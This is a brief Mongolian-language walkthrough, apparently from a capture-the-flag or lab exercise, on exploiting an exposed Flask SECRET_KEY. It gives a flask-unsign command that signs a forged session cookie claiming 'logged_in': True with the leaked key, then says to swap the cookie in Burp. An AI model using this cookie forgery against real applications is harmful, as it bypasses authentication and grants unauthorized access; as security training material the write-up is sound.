# Flask SECRET_KEY Exposed

### 1. Flask-Unsign ашиглан Sign хийх

Бидэнд байгаа нууц түлхүүр: `Fl@sKy_Sup3R_S3cR3T`
Бидэнд хэрэгтэй өгөгдөл: `{'logged_in': True}`

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'Fl@sKy_Sup3R_S3cR3T'
```

Энэ тушаалыг ажиллуулахад терминал дээр чинь `.`-оор тусгаарлагдсан урт текст (cookie) гарч ирнэ. Үүнийг хуулж ав.

[image]

### 2. Burp дээрээ Cookie-г солих

[image]
